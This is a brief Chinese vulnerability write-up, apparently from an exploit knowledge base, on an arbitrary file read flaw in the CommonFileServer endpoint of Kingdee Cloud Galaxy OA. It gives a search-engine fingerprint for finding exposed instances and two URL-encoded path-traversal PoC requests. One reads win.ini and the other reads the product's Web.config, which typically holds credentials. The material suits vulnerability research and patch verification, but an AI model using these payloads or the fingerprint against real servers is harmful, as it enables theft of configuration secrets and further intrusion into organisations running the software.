# 金蝶OA 云星空 CommonFileServer 任意文件读取漏洞

## 漏洞描述

金蝶OA 云星空 CommonFileServer接口存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感文件，进一步攻击服务器

## 漏洞影响

<a-checkbox checked>金蝶OA 云星空</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="金蝶云星空-管理中心"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1684495679897-2feb46d7-5571-44e5-b6d1-b5997d685a9f.png)

验证POC

```python
/CommonFileServer/c%3a%2fwindows%2fwin.ini
/CommonFileServer/C%3A%5CProgram%20Files%20%28x86%29%5CKingdee%5CK3Cloud%5CWebSite%5CWeb.config
```

![img](../../../.vuepress/public/img/1684495701547-33614a2b-d201-49e4-be6e-b0dd7aee10c3.png)